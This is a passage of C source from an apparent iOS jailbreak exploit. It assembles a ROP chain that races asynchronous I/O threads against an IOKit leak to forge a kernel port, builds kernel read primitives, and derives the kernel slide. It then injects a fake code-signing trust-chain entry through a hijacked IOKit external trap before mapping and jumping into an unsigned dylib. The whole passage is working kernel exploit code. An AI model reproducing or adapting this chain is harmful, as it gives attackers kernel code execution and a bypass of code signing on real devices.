	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
	new_entry->count = 1;
	hash_t my_dylib_hash = {0x04,0xc9,0x9b,0x00,0x5e,0xe4,0x40,0x3b,0xf9,0x19,0x5c,0x93,0xb3,0xb3,0xc8,0x36,0x3b,0x38,0x50,0xb1};
	memcpy(&new_entry->hash[0],my_dylib_hash,20);
	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);

	char * dylib_str = malloc(100);
	snprintf(dylib_str,100,"/usr/lib/racoon.dylib");
	DEFINE_ROP_VAR("dylib_str",strlen(dylib_str)+1,dylib_str);

	char * wedidit_msg = malloc(1024);
	snprintf(wedidit_msg,1024,"WE DID IT\n");
	DEFINE_ROP_VAR("WEDIDIT",strlen(wedidit_msg)+1,wedidit_msg);

	ADD_COMMENT("mach_task_self");
	CALL_FUNC_RET_SAVE_VAR("self",get_addr_from_name(offsets,"mach_task_self"),0,0,0,0,0,0,0,0);

	ADD_COMMENT("get reply port");
	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),tmp);
	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);

	// block all the signals the racing threads use
	for (int i = 0; i < 4; i++){ 
		DEFINE_ROP_VAR("mysigmask",sizeof(uint64_t),tmp);
		SET_ROP_VAR64("mysigmask",(1 << (SIGWINCH-1+i)));
		ROP_VAR_ARG_HOW_MANY(1);
		ROP_VAR_ARG("mysigmask",2);
		CALL("__pthread_sigmask",SIG_BLOCK,0,0,0,0,0,0,0);
	}

	DEFINE_ROP_VAR("mach_host",sizeof(mach_port_t),tmp);
	CALL_FUNC_RET_SAVE_VAR("mach_host",get_addr_from_name(offsets,"mach_host_self"),0,0,0,0,0,0,0,0);

	DEFINE_ROP_VAR("master_port",sizeof(mach_port_t),tmp);
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG64("mach_host",1);
	ROP_VAR_ARG("master_port",2);
	CALL("host_get_io_master",0,0,0,0,0,0,0,0);

	// implementing IOServiceGetMatchingService
	CFMutableDictionaryRef myservice_dict = IOServiceMatching("IOPMrootDomain");
	CFDataRef myservice_serialized = IOCFSerialize(myservice_dict, kIOCFSerializeToBinary /*gIOKitLibSerializeOptions*/);
	CFRelease(myservice_dict);
	uint64_t data_length = CFDataGetLength(myservice_serialized);

	// TODO: move those structs into a seperate file
	struct GetMatchingService_Request {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
		char matching[4096];
	};

	struct GetMatchingService_Reply {
		mach_msg_header_t Head;
		mach_msg_body_t body;
		mach_msg_port_descriptor_t service;
		mach_msg_trailer_t trailer;
	};

	struct GetMatchingService_Request * service_request = malloc(sizeof(struct GetMatchingService_Request));
	memset(service_request,0,sizeof(struct GetMatchingService_Request));
	service_request->NDR = NDR_record;
	service_request->Head.msgh_bits = MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
	service_request->Head.msgh_id = 2880;
	service_request->Head.msgh_reserved = 0;
	service_request->matchingCnt = data_length;
	memcpy(service_request->matching,CFDataGetBytePtr(myservice_serialized),data_length);

	DEFINE_ROP_VAR("service_request",sizeof(struct GetMatchingService_Request),service_request);
	ROP_VAR_CPY_W_OFFSET("service_request",offsetof(struct GetMatchingService_Request,Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
	ROP_VAR_CPY_W_OFFSET("service_request",offsetof(struct GetMatchingService_Request,Head.msgh_remote_port),"master_port",0,sizeof(mach_port_t));

	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG("service_request",1);
	ROP_VAR_ARG64("reply_port",5);
	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct GetMatchingService_Request)-4096+((data_length+3) & ~3), sizeof(struct GetMatchingService_Reply), 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);

	ROP_VAR_CPY_W_OFFSET("service",0,"service_request",offsetof(struct GetMatchingService_Reply,service.name),sizeof(mach_port_t));

	// IOServiceOpen
	
	// TODO: move those structs into a seperate file
	struct ServiceOpen_Request {
		mach_msg_header_t Head;
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t owningTask;
		mach_msg_ool_descriptor_t properties;
		NDR_record_t NDR;
		uint32_t connect_type;
		NDR_record_t ndr;
		mach_msg_type_number_t propertiesCnt;
	};

	struct ServiceOpen_Reply {
		mach_msg_header_t Head;
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t connection;
		NDR_record_t NDR;
		kern_return_t result;
		mach_msg_trailer_t trailer;
	};

	struct ServiceOpen_Request * service_open_request = malloc(sizeof(struct ServiceOpen_Request));
	memset(service_open_request,0,sizeof(struct ServiceOpen_Request));
	service_open_request->msgh_body.msgh_descriptor_count = 2;
	service_open_request->owningTask.disposition = 19;
	service_open_request->owningTask.type = MACH_MSG_PORT_DESCRIPTOR;

	/* .address .size is already 0 because of the memset */
	service_open_request->properties.deallocate = false; /* guess that's also 0 */
	service_open_request->properties.copy = MACH_MSG_PHYSICAL_COPY;
	service_open_request->properties.type = MACH_MSG_OOL_DESCRIPTOR;

	service_open_request->NDR = NDR_record;
	service_open_request->connect_type = 0;
	service_open_request->ndr = NDR_record;

	// .propertiesCnt is also 0 */
	
	service_open_request->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
	service_open_request->Head.msgh_id = 2862;
	service_open_request->Head.msgh_reserved = 0;

	DEFINE_ROP_VAR("service_open_request",sizeof(struct ServiceOpen_Request),service_open_request);
	
	ROP_VAR_CPY_W_OFFSET("service_open_request",offsetof(struct ServiceOpen_Request,Head.msgh_remote_port),"service",0,sizeof(mach_port_t));
	ROP_VAR_CPY_W_OFFSET("service_open_request",offsetof(struct ServiceOpen_Request,Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
	ROP_VAR_CPY_W_OFFSET("service_open_request",offsetof(struct ServiceOpen_Request,owningTask.name),"self",0,sizeof(mach_port_t));

	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG("service_open_request",1);
	ROP_VAR_ARG64("reply_port",5);
	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct ServiceOpen_Request),sizeof(struct ServiceOpen_Reply),0,MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);

	ROP_VAR_CPY_W_OFFSET("client",0,"service_open_request",offsetof(struct ServiceOpen_Reply,connection.name),sizeof(mach_port_t));


	// TODO: move that into install.m or somewhere else (prob even better to put it into offsets straight away)
#define BARRIER_BUFFER_SIZE 0x10000
	// spawn racer threads
	
	// TODO: move this struct into a seperate file
#define _STRUCT_ARM_THREAD_STATE64	struct __darwin_arm_thread_state64
_STRUCT_ARM_THREAD_STATE64
{
	__uint64_t    __x[29];	/* General purpose registers x0-x28 */
	__uint64_t    __fp;		/* Frame pointer x29 */
	__uint64_t    __lr;		/* Link register x30 */
	__uint64_t    __sp;		/* Stack pointer x31 */
	__uint64_t    __pc;		/* Program counter */
	__uint32_t    __cpsr;	/* Current program status register */
};
	DEFINE_ROP_VAR("racer_kernel_thread",sizeof(thread_act_t),tmp);
	_STRUCT_ARM_THREAD_STATE64 * new_thread_state = malloc(sizeof(_STRUCT_ARM_THREAD_STATE64));
	memset(new_thread_state,0,sizeof(_STRUCT_ARM_THREAD_STATE64));
	new_thread_state->__pc = offsets->longjmp-0x180000000+offsets->new_cache_addr; /*slide it here*/
	new_thread_state->__x[0] = offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/;
	DEFINE_ROP_VAR("thread_state",sizeof(_STRUCT_ARM_THREAD_STATE64),new_thread_state)
	/*
	ROP_VAR_ARG_HOW_MANY(3);
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG("thread_state",3);
	ROP_VAR_ARG("racer_kernel_thread",5);
	CALL("thread_create_running",0,ARM_THREAD_STATE64,0,sizeof(_STRUCT_ARM_THREAD_STATE64)/4,0,0,0,0);
	*/

	
	
	DEFINE_ROP_VAR("racer_kernel_thread2",sizeof(thread_act_t),tmp);
	_STRUCT_ARM_THREAD_STATE64 * new_thread_state2 = malloc(sizeof(_STRUCT_ARM_THREAD_STATE64));
	memset(new_thread_state2,0,sizeof(_STRUCT_ARM_THREAD_STATE64));
	new_thread_state2->__pc = offsets->longjmp-0x180000000+offsets->new_cache_addr; /*slide it here*/
	new_thread_state2->__x[0] = offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE + offsets->thread_max_size; /*x0 should point to the longjmp buf*/;
	DEFINE_ROP_VAR("thread_state2",sizeof(_STRUCT_ARM_THREAD_STATE64),new_thread_state2)
	/*
	ROP_VAR_ARG_HOW_MANY(3);
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG("thread_state2",3);
	ROP_VAR_ARG("racer_kernel_thread2",5);
	CALL("thread_create_running",0,ARM_THREAD_STATE64,0,sizeof(_STRUCT_ARM_THREAD_STATE64)/4,0,0,0,0);
	*/


	// we need to wait for a short amout of time till the other thread called open
	// we can't call usleep on it's own so we just run our own implementation
#define ADD_USLEEP(usec) \
	ROP_VAR_ARG_HOW_MANY(1); \
	ROP_VAR_ARG64("reply_port",5); \
	CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_TIMEOUT | MACH_RCV_INTERRUPT,0,0,0 /*recv port*/, (usec+999)/1000, MACH_PORT_NULL,0);

	// TODO: we can prob remove this when we chown the log to mobile or change the permissions
	ADD_USLEEP(100);

	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16

	// TODO: optimize this loop (we don't have to create a port on each try and the memleak_msg can leak 10 objs at once instead of calling the syscall 10 times)
	ADD_LOOP_START("main_loop");
	
		SET_ROP_VAR64("msg_port",MACH_PORT_NULL); 

		// mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, msg_port);
		ROP_VAR_ARG_HOW_MANY(2);
		ROP_VAR_ARG64("self",1);
		ROP_VAR_ARG("msg_port",3);
		CALL("mach_port_allocate", 0, MACH_PORT_RIGHT_RECEIVE, 0,0,0,0,0,0);
	
		ROP_VAR_ARG_HOW_MANY(3);
		ROP_VAR_ARG64("self",1);
		ROP_VAR_ARG64("msg_port",2);
		ROP_VAR_ARG64("msg_port",3);
		CALL("mach_port_insert_right",0,0,0, MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);

		ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,head.msgh_remote_port),"msg_port",0,sizeof(mach_port_t));
		SET_ROP_VAR32("tmp_port",0); // make sure tmp_port really is zero

		ROP_VAR_ARG_HOW_MANY(1);
		ROP_VAR_ARG("ool_msg",1);
		CALL("mach_msg",0,MACH_SEND_MSG,ool_message->head.msgh_size,0,0,0,0,0);

		// no need for another loop in rop... we can just unroll this one here
		
		ROP_VAR_CPY_W_OFFSET("memleak_msg",offsetof(MEMLEAK_Request,Head.msgh_remote_port),"client",0,sizeof(mach_port_t)); // set memleak_msg->Head.msgh_request_port
		for (int i = 0; i < 10; i++) {
			ROP_VAR_ARG_HOW_MANY(1);
			ROP_VAR_ARG("memleak_msg",1);
			CALL("mach_msg",0,MACH_SEND_MSG | MACH_MSG_OPTION_NONE, sizeof(MEMLEAK_msg),0,0,0,0,0);
		}

		ROP_VAR_CPY_W_OFFSET("ool_msg_recv", offsetof(ool_message_struct,head.msgh_local_port),"msg_port",0,sizeof(mach_port_t));

		ROP_VAR_ARG_HOW_MANY(2);
		ROP_VAR_ARG("ool_msg_recv",1);
		ROP_VAR_ARG64("msg_port",5);
		CALL("mach_msg",0,MACH_RCV_MSG,0,sizeof(ool_message_struct),0,0,0,0);


		// check if we found a port:

		// copy the descriptor address into it's own var
		ROP_VAR_ARG_HOW_MANY(2);
		ROP_VAR_ARG_W_OFFSET("ool_msg_recv",2,offsetof(ool_message_struct,desc[0].address));
		ROP_VAR_ARG("desc_addr",1);
		CALL("memcpy",0,0,8,0,0,0,0,0);

		// copy the first 4 bytes at the descriptor address into the_one
		ROP_VAR_ARG_HOW_MANY(2);
		ROP_VAR_ARG("the_one",1);
		ROP_VAR_ARG64("desc_addr",2);
		CALL("memcpy",0,0,4,0,0,0,0,0);

		// set x0 to the_one
		SET_X0_FROM_ROP_VAR("the_one");
		// break out of the loop if x0 is nonzero
		ADD_LOOP_BREAK_IF_X0_NONZERO("main_loop");

	ADD_LOOP_END();

	SET_ROP_VAR64("should_race",1); // stop the other thread

	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("WEDIDIT",2);
	CALL("write",1,0,1024,0,0,0,0,0);

	// get kernel slide
	// alloc new valid port 
	DEFINE_ROP_VAR("notification_port",sizeof(mach_port_t),tmp);
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG("notification_port",3);
	CALL("_kernelrpc_mach_port_allocate_trap",0,MACH_PORT_RIGHT_RECEIVE,0,0,0,0,0,0);

	// set notification port on our fake port so that we can read back the pointer
	ROP_VAR_ARG_HOW_MANY(4);
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG64("the_one",2);
	ROP_VAR_ARG64("notification_port",5);
	ROP_VAR_ARG("tmp_port",7);
	CALL("mach_port_request_notification",0,0,MACH_NOTIFY_PORT_DESTROYED, 0, 0, MACH_MSG_TYPE_MAKE_SEND_ONCE,0,0);

	// get the heap addr
	DEFINE_ROP_VAR("heap_addr",sizeof(uint64_t),tmp);
	ROP_VAR_CPY_W_OFFSET("heap_addr",0,"fakeport",offsetof(kport_t,ip_pdrequest) /*offset of fakeport.ip_pdrequest*/,sizeof(uint64_t));

	
	// setup kr32
	DEFINE_ROP_VAR("ip_requests_buf",0x20,tmp);
	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport", offsetof(kport_t,ip_requests) /*offset of fakeport.ip_requests*/,"ip_requests_buf",0);

	DEFINE_ROP_VAR("out_sz",8,tmp);
	SET_ROP_VAR64("out_sz",1);
#define kr32(addr_var,valuename) \
	ROP_VAR_CPY_W_OFFSET("ip_requests_buf",offsets->ipr_size,addr_var,0,8); \
	ROP_VAR_ARG_HOW_MANY(4); \
	ROP_VAR_ARG64("self",1); \
	ROP_VAR_ARG64("the_one",2); \
	ROP_VAR_ARG(valuename,4); \
	ROP_VAR_ARG("out_sz",5); \
	CALL("mach_port_get_attributes",0,0,MACH_PORT_DNREQUESTS_SIZE, 0, 0,0,0,0);


	// setup kr64

	DEFINE_ROP_VAR("tmp_32_val",8,tmp);
	DEFINE_ROP_VAR("upper_32_bits_addr",8,tmp);
#define kr64(addr_val,valuename) \
	SET_ROP_VAR64("upper_32_bits_addr",4); \
	ROP_VAR_ADD("upper_32_bits_addr","upper_32_bits_addr",addr_val); \
	kr32("upper_32_bits_addr","tmp_32_val"); \
	kr32(addr_val,valuename); \
	ROP_VAR_CPY_W_OFFSET(valuename,4,"tmp_32_val",0,4);	

	// get recv addr from heap addr
	DEFINE_ROP_VAR("recv_heap_addr",8,tmp);
	DEFINE_ROP_VAR("heap_addr_recv_ptr",8,tmp);
	SET_ROP_VAR64("heap_addr_recv_ptr",offsetof(kport_t,ip_receiver));
	ROP_VAR_ADD("heap_addr_recv_ptr","heap_addr_recv_ptr","heap_addr");
	kr64("heap_addr_recv_ptr","recv_heap_addr");


	// get the task pointer from our recv addr
	DEFINE_ROP_VAR("task_pointer",8,tmp);
	DEFINE_ROP_VAR("heap_addr_task_ptr",8,tmp);
	SET_ROP_VAR64("heap_addr_task_ptr",offsets->is_task);
	ROP_VAR_ADD("heap_addr_task_ptr","heap_addr_task_ptr","recv_heap_addr");
	kr64("heap_addr_task_ptr","task_pointer");


	// register the client we have onto our task
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG("client",2);
	CALL("mach_ports_register",0,0,1,0,0,0,0,0);

	// get the address of the client port
	DEFINE_ROP_VAR("ip_kobject_client_port",8,tmp);
	DEFINE_ROP_VAR("ip_kobject_ptr",8,tmp);
	SET_ROP_VAR64("ip_kobject_ptr",offsets->itk_registered);
	ROP_VAR_ADD("ip_kobject_ptr","ip_kobject_ptr","task_pointer");
	kr64("ip_kobject_ptr","ip_kobject_client_port");

	// get the UC obj
	DEFINE_ROP_VAR("kobj_client",8,tmp);
	DEFINE_ROP_VAR("kobj_client_ptr",8,tmp);
	SET_ROP_VAR64("kobj_client_ptr",offsetof(kport_t,ip_kobject));
	ROP_VAR_ADD("kobj_client_ptr","kobj_client_ptr","ip_kobject_client_port");
	kr64("kobj_client_ptr","kobj_client");

	// get the VTAB
	DEFINE_ROP_VAR("RootDomainUC_VTAB",8,tmp);
	kr64("kobj_client","RootDomainUC_VTAB");

	// get the slide
	DEFINE_ROP_VAR("kslide",8,tmp);
	SET_ROP_VAR64("kslide",((0xffffffffffffffff - offsets->rootdomainUC_vtab) + 1));
	ROP_VAR_ADD("kslide","kslide","RootDomainUC_VTAB");


	// fully setup trust chain entry now
	DEFINE_ROP_VAR("bss_trust_chain_head",8,tmp);
	DEFINE_ROP_VAR("bss_trust_chain_head_ptr",8,tmp);
	SET_ROP_VAR64("bss_trust_chain_head_ptr",offsets->trust_chain_head_ptr);
	ROP_VAR_ADD("bss_trust_chain_head_ptr","bss_trust_chain_head_ptr","kslide");
	kr64("bss_trust_chain_head_ptr","bss_trust_chain_head");
	ROP_VAR_CPY_W_OFFSET("new_trust_chain_entry",offsetof(struct trust_chain,next),"bss_trust_chain_head",0,8);

	DEFINE_ROP_VAR("swapprefix_buffer",1024,tmp);
	DEFINE_ROP_VAR("swapprefix_length",sizeof(uint64_t),tmp);
	// using undocumented magic to get the integer name of vm.swapfileprefix
	char * name = "vm.swapfileprefix";
	int name2oid[2] = {0,3};
	int * real_oid = malloc(CTL_MAXNAME+2);
	size_t oidlen;
	sysctl(name2oid,2,real_oid,&oidlen,name,strlen(name));
	DEFINE_ROP_VAR("swapprefix_oid",oidlen,real_oid);
	ROP_VAR_ARG_HOW_MANY(3);
	ROP_VAR_ARG("swapprefix_oid",1);
	ROP_VAR_ARG("swapprefix_buffer",3);
	ROP_VAR_ARG("swapprefix_length",4);
	CALL("sysctl",0,oidlen/4,0,0,0,0,0,0);
	// we just assume that the prefix isn't longer than 100 bytes
	ROP_VAR_CPY_W_OFFSET("swapprefix_buffer",100,"new_trust_chain_entry",0,sizeof(struct trust_chain));
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG("swapprefix_oid",1);
	ROP_VAR_ARG("swapprefix_buffer",5);
	CALL("sysctl",0,oidlen/4,0,0,100+sizeof(struct trust_chain),0,0,0);

	// now the new trust chain entry is at swapprefix_addr + kslide + 100
	uint64_t * trust_chain_addr = malloc(sizeof(uint64_t));
	*trust_chain_addr = offsets->swapprefix_addr+100;
	DEFINE_ROP_VAR("new_trust_chain_entry_addr",8,trust_chain_addr);
	ROP_VAR_ADD("new_trust_chain_entry_addr","new_trust_chain_entry_addr","kslide");
	

#define VTAB_SIZE 0x100 // TODO: seperate file
	// setup fake vtab in userland
	DEFINE_ROP_VAR("UC_VTAB",VTAB_SIZE*8,tmp);
	DEFINE_ROP_VAR("tmp_uint64",8,tmp);
	DEFINE_ROP_VAR("vtab_ptr",8,tmp);
	ROP_VAR_CPY("vtab_ptr","RootDomainUC_VTAB",8);
	// unroll that loop cause loops in ROP are inefficent
	for (int i = 0; i < VTAB_SIZE; i++) {
		kr64("vtab_ptr","tmp_uint64");
		ROP_VAR_CPY_W_OFFSET("UC_VTAB",i*8,"tmp_uint64",0,8);
		SET_ROP_VAR64("tmp_uint64",8);
		ROP_VAR_ADD("vtab_ptr","vtab_ptr","tmp_uint64");
	}

	// turn the_one into a fake UC port
	
	// create a fake UC
	DEFINE_ROP_VAR("fake_client",200,tmp);
	SET_ROP_VAR64_TO_VAR_W_OFFSET("fake_client",0,"UC_VTAB",0);

	// update fakeport as iokit obj
	SET_ROP_VAR32_W_OFFSET("fakeport",IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT,offsetof(kport_t,ip_bits));

#undef kr32
#undef kr64

	// insert new fake client
	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport",offsetof(kport_t,ip_kobject),"fake_client",0);
	
	// patch getExternalTrapForIndex
	SET_ROP_VAR64("tmp_uint64",offsets->gadget_add_x0_x0_ret);
	ROP_VAR_ADD("tmp_uint64","tmp_uint64","kslide");
	ROP_VAR_CPY_W_OFFSET("UC_VTAB",(0xb7*8),"tmp_uint64",0,8);

	// copyin new head
	
	// setup call primitive
	DEFINE_ROP_VAR("copyin_func_ptr",8,tmp);
	SET_ROP_VAR64("copyin_func_ptr",offsets->copyin);
	ROP_VAR_ADD("copyin_func_ptr","copyin_func_ptr","kslide");
	ROP_VAR_CPY_W_OFFSET("fake_client",0x48,"copyin_func_ptr",0,8);
	// setup x0
	ROP_VAR_CPY_W_OFFSET("fake_client",0x40,"bss_trust_chain_head_ptr",0,8);

	// fire
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG64("the_one",1);
	ROP_VAR_ARG("new_trust_chain_entry_addr",3);
	CALL("IOConnectTrap6",0,0,0,8,0,0,0,0);
	

	// ghetto dlopen
	// get a file descriptor for that dylib
	DEFINE_ROP_VAR("dylib_fd",8,tmp);
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("dylib_str",1);
	CALL_FUNC_RET_SAVE_VAR("dylib_fd",get_addr_from_name(offsets,"open"),0,O_RDONLY,0,0,0,0,0,0);
	// map it at a fixed address
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG64("dylib_fd",5);
	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_PRIVATE,0,offsets->stage3_fileoffset,0,0);
	// jump
	CALL_FUNCTION_NO_SLIDE(offsets->BEAST_GADGET,offsets->stage3_jumpaddr,0xdeadbeef,get_addr_from_name(offsets,"write")-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);


	// TODO: figure out what the hell is wrong with those two threads below
	// SECOND THREAD STACK STARTS HERE
	ADD_BARRIER(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE);
 

	// longjmp buf, pivoting everything
	ADD_GADGET(); /* x19 */
    ADD_GADGET(); /* x20 */
    ADD_GADGET(); /* x21 */
    ADD_GADGET(); /* x22 */
    ADD_GADGET(); /* x23 */
    ADD_GADGET(); /* x24 */
    ADD_GADGET(); /* x25 */
    ADD_GADGET(); /* x26 */
    ADD_GADGET(); /* x27 */
    ADD_GADGET(); /* x28 */
    ADD_GADGET(); /* x29 */
    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 */ 
    ADD_GADGET(); /* x29 */ 
    ADD_STATIC_GADGET(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE+22*8 /*jump over that longjmp buffer here*/); /* x2 */ 
    ADD_GADGET(); /* D8 */
    ADD_GADGET(); /* D9 */
    ADD_GADGET(); /* D10 */
    ADD_GADGET(); /* D11 */
    ADD_GADGET(); /* D12 */
    ADD_GADGET(); /* D13 */
    ADD_GADGET(); /* D14 */
    ADD_GADGET(); /* D15 */
	
	char * racer_path = malloc(100);
	snprintf(racer_path,100,"/private/var/log/racoon.log");
	DEFINE_ROP_VAR("racer_path",100,racer_path);

	//  int fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
	DEFINE_ROP_VAR("racer_fd",sizeof(uint64_t),tmp);
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("racer_path",1);
	CALL_FUNC_RET_SAVE_VAR("racer_fd",get_addr_from_name(offsets,"open"),0,O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO,0,0,0,0,0);

	DEFINE_ROP_VAR("aio_list",NENT * 8,tmp);
	DEFINE_ROP_VAR("aios",NENT * sizeof(struct aiocb),tmp);
	DEFINE_ROP_VAR("aio_buf",NENT,tmp);

	// block all the racing signals and unblock the one we use below
	for (int i = 0; i < 4; i++){ 
		DEFINE_ROP_VAR("mysigmask",sizeof(uint64_t),tmp);
		SET_ROP_VAR64("mysigmask",(1 << (SIGWINCH-1+i)));
		ROP_VAR_ARG_HOW_MANY(1);
		ROP_VAR_ARG("mysigmask",2);
		CALL("__pthread_sigmask",SIG_BLOCK,0,0,0,0,0,0,0);
	}

	DEFINE_ROP_VAR("signal_set",sizeof(sigset_t),tmp);
	SET_ROP_VAR64("signal_set",(1 << (SIGWINCH-1)));

	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("signal_set",2);
	CALL("__pthread_sigmask",SIG_UNBLOCK,0,NULL,0,0,0,0,0);

	DEFINE_ROP_VAR("sigevent",sizeof(struct sigevent),tmp);
	SET_ROP_VAR32_W_OFFSET("sigevent",SIGEV_SIGNAL,offsetof(struct sigevent,sigev_notify));
	SET_ROP_VAR32_W_OFFSET("sigevent",SIGWINCH,offsetof(struct sigevent,sigev_signo));

	struct __sigaction * myaction = malloc(sizeof(struct __sigaction));
	memset(myaction,0,sizeof(struct __sigaction));
	myaction->sa_handler = (void (*)(int)) offsets->rop_nop-0x180000000+offsets->new_cache_addr;
	myaction->sa_tramp = (void (*)(void *, int, int, siginfo_t *, void *)) get_addr_from_name(offsets,"_sigtramp")-0x180000000+offsets->new_cache_addr;
	myaction->sa_mask = (1 << (SIGWINCH-1));
	DEFINE_ROP_VAR("my_action",sizeof(struct __sigaction),myaction);
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("my_action",2);
	CALL("__sigaction",SIGWINCH,0,0,0,0,0,0,0);

	for (uint32_t i = 0; i < NENT; i++) {
		int offset = sizeof(struct aiocb) * i;
		ROP_VAR_CPY_W_OFFSET("aios",offset + offsetof(struct aiocb,aio_fildes),"racer_fd",0,4);
		SET_ROP_VAR64_W_OFFSET("aios",0,offset + offsetof(struct aiocb,aio_offset)); 
		SET_ROP_VAR64_TO_VAR_W_OFFSET("aios",offset+offsetof(struct aiocb,aio_buf),"aio_buf",i);
		SET_ROP_VAR64_W_OFFSET("aios",1,offset + offsetof(struct aiocb,aio_nbytes));
		SET_ROP_VAR32_W_OFFSET("aios",LIO_READ,offset + offsetof(struct aiocb,aio_lio_opcode)); 
		SET_ROP_VAR32_W_OFFSET("aios",SIGEV_NONE,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify));

		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list",i*8,"aios",offset);
	}

	// TODO: optimize this (we don't need the aio_return value do we)
	ADD_LOOP_START("racer_loop");
		for (int i = 0; i<64;i++) {
			ROP_VAR_ARG_HOW_MANY(2);
			ROP_VAR_ARG("aio_list",2);
			ROP_VAR_ARG("sigevent",4);
			CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
		}
		ROP_VAR_ARG_HOW_MANY(1);
		ROP_VAR_ARG64("reply_port",5); 
		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_RCV_TIMEOUT,0,0,0 /*recv port*/, 1, MACH_PORT_NULL,0);
		
		for (int i = 0; i < NENT; i++) {
			ROP_VAR_ARG_HOW_MANY(1);
			ROP_VAR_ARG64_W_OFFSET("aio_list",1,i*8);
			CALL("aio_return",0,0,0,0,0,0,0,0);
		}

		// set x0 
		SET_X0_FROM_ROP_VAR("should_race");
		// break out of the loop if x0 is nonzero
		ADD_LOOP_BREAK_IF_X0_NONZERO("racer_loop");
	ADD_LOOP_END();
	
	// this thread wasn't spawned using pthread so we can't easily exit...
	ADD_LOOP_START("endless_thread_loop");
		ADD_USLEEP(10000000);
	ADD_LOOP_END();

	// THREAD 3 starts here
	ADD_BARRIER(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE + offsets->thread_max_size);
 

	// longjmp buf, pivoting everything
	ADD_GADGET(); /* x19 */
    ADD_GADGET(); /* x20 */
    ADD_GADGET(); /* x21 */
    ADD_GADGET(); /* x22 */
    ADD_GADGET(); /* x23 */
    ADD_GADGET(); /* x24 */
    ADD_GADGET(); /* x25 */
    ADD_GADGET(); /* x26 */
    ADD_GADGET(); /* x27 */
    ADD_GADGET(); /* x28 */
    ADD_GADGET(); /* x29 */
    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 */ 
    ADD_GADGET(); /* x29 */ 
    ADD_STATIC_GADGET(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE + offsets->thread_max_size+ 22*8 /*jump over that longjmp buffer here*/); /* x2 */ 
    ADD_GADGET(); /* D8 */
    ADD_GADGET(); /* D9 */
    ADD_GADGET(); /* D10 */
    ADD_GADGET(); /* D11 */
    ADD_GADGET(); /* D12 */
    ADD_GADGET(); /* D13 */
    ADD_GADGET(); /* D14 */
    ADD_GADGET(); /* D15 */

	//  int fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
	DEFINE_ROP_VAR("racer_fd2",sizeof(uint64_t),tmp);
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("racer_path",1);
	CALL_FUNC_RET_SAVE_VAR("racer_fd2",get_addr_from_name(offsets,"open"),0,O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO,0,0,0,0,0);

